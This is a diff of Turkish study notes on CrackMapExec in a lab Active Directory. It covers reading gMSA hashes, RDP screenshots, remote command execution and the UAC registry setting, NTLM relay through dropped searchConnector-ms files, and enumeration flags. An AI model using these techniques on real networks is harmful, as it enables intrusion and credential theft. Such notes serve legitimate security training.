+Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.
 
 
 ### gMSA Parolasını Edinme
-![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+{{CODE_BLOCK_143}}
 
 Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
 
-
 ### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
-![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
-![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
 
+{{CODE_BLOCK_144}}
+
+
+---
 
 ### RDP Screenshots
-RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz
 
 
 ### Enumerate Login Prompt
-![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+{{CODE_BLOCK_145}}
 
 Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
 
 
-### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma
+
+{{CODE_BLOCK_146}}
+
 ![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
 
-Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
 
-Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
-
-
-
-### Taking a Screenshot
-![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
-![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır
 
 
-Not: --screentime ve --res isteğe bağlı bayraklardır.
+### Screenshot Alma
+
+{{CODE_BLOCK_147}}
+
+
+Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.
 
 Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
 
 
 ### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+
+{{CODE_BLOCK_148}}
+
 ![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
 
-
-Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
-
+Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.
 
 
-
+---
 
 ### Command Execution
 
-Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
 
-![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`
 
-Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.
 
-Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
 
 
+### Administrator Olarak Komut Yürütme
 
-### Command Execution as Administrator
-Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
 
 
 ### Bir Komutu Administrator Olarak Çalıştırma
-![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
-![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+{{CODE_BLOCK_149}}
 
 
-### RID 500 Dışı Hesap Olarak Komut Yürütme
-Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+### RID 500 Olmayan Hesap Olarak Komut Yürütme
+
+Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:
 
 ### Komutu localadmin olarak çalıştırma
-![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
 
-Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+{{CODE_BLOCK_150}}
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.
 
 
 ### LocalAccountTokenFilterPolicy'yi Değiştirme
-![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
 
-![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+{{CODE_BLOCK_151}}
+
+
+{{CODE_BLOCK_152}}
 
 
 ### Domain Hesabı Olarak Komut Yürütme
-LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
 
 
 ### Komutu Robert olarak çalıştır
-![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+{{CODE_BLOCK_153}}
 
 
 ### SMB ile Komut Yürütme
-CME'nin dört (4) farklı komut yürütme yöntemi vardır:
-![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
 
-Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+
+| Komut   | Açıklama                                                                                                                             |
+| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
+| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
+| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
+| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |
+
+Not: Her yöntem her bilgisayarda çalışmayabilir.
 
 Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
 
-![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec
 
-CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
 
 
 ### SMBExec Yöntemi ile Komut Yürütme
-![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+{{CODE_BLOCK_154}}
 
 Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
 
-
 ### wmiexec aracılığıyla PowerShell Komut Yürütme
-![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
-![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+{{CODE_BLOCK_155}}
+
 
 PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
 
@@ -13836,235 +14781,261 @@ Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP
 {{CODE_BLOCK_121}}
 
 ### drop-sc Modülü ile Hash'lerin Çalınması
-Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
 
-Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.
 
-CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.
+
+CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.
 
 İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
 
-* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır
 
-* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.
 
-* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
 
 Drop-sc'yi iş başında görelim:
 
-
 ### Dropping a searchConnector-ms File
 
-![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+{{CODE_BLOCK_122}}
 
-![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+{{CODE_BLOCK_123}}
 
-Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.
 
+### NTLMRelayx ve drop-sc Kullanarak Yönlendirme
 
-### NTLMRelayx ve drop-sc Kullanarak Aktarma
+{{CODE_BLOCK_124}}
 
-![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
-![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
-
-Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:
 
 
 ### searchConnector-ms Dosyalarını Temizleme
-![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
-![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
 
-LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+{{CODE_BLOCK_125}}
 
 
-### SMB ile Eşleme ve Numaralandırma
+LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.
+
+---
+
+
+### SMB ile Mapping ve Enumeration
 
 CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
 
-![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
-![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+| Komut                                                                 | Açıklama                                                          |
+| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |
 
 Daha önce çalışmamış olanları gözden geçirelim:
 
-### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma
 
-Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.
 
 
 ### Sessions ve loggendon-users seçeneklerini kullanma
-![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
 
-Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+{{CODE_BLOCK_126}}
+
+Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.
 
 
 ### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
-![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
-![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+{{CODE_BLOCK_127}}
+
+Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.
+
 
 
 ### Enumerate Computers
 
 CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
 
-
 ### Domain'deki Bilgisayarları Numaralandırma
-![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+{{CODE_BLOCK_128}}
+
 
 Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
 
 
 ### Enumerate LAPS
 
-Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.
 
-![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
 
-![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+{{CODE_BLOCK_129}}
 
-![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
-
-Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
-
+Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.
 
 ### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
 
-Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
 
 
 ### List Local Users
 
-![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
-![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
-![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
-![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
-![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+{{CODE_BLOCK_130}}
 
-Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.
 
-rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
-
+`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
 
 ### Enumerate Disks
 
-Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.
 
 ### Enumerating Disks
-![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+{{CODE_BLOCK_131}}
 
 
 ### Local ve Domain Gruplarını Numaralandırma
-Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.
 
 ### Enumerating Local Groups
-![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
-![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
 
+{{CODE_BLOCK_132}}
 
 ### Enumerating Domain Groups
-![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
-![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
 
-Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+{{CODE_BLOCK_133}}
+
+
+Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.
 
 
 ### Group **Members**
-![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
 
-Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+{{CODE_BLOCK_134}}
+
+Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
 
 
-### Querying WMI
-[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+### WMI Sorgulama
 
